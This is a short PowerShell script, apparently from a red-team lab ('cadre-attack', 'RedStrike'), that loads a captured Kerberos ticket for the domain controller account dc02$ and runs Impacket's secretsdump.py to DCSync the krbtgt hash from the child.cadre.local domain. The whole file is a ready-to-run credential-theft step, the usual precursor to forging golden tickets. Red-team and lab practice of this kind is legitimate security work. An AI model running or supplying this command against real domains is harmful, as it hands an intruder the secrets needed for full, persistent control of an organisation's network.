[CmdletBinding()]
param(
    [string]$Ccache = "C:\Tools\cadre-attack\T102-capture\dc02.ccache"
)
$ErrorActionPreference = "Continue"

$sd = 'C:\Tools\RedStrike\.venv\Scripts\secretsdump.py'
$py = 'C:\Tools\RedStrike\.venv\Scripts\python.exe'

$env:KRB5CCNAME = $Ccache
Write-Output "--- secretsdump.py -k as dc02$ -- just-dc-user child/krbtgt ---"
& $py $sd 'child.cadre.local/dc02$@dc02.child.cadre.local' -k -no-pass -just-dc-user 'child/krbtgt' 2>&1 | ForEach-Object { Write-Output "SD|$_" }
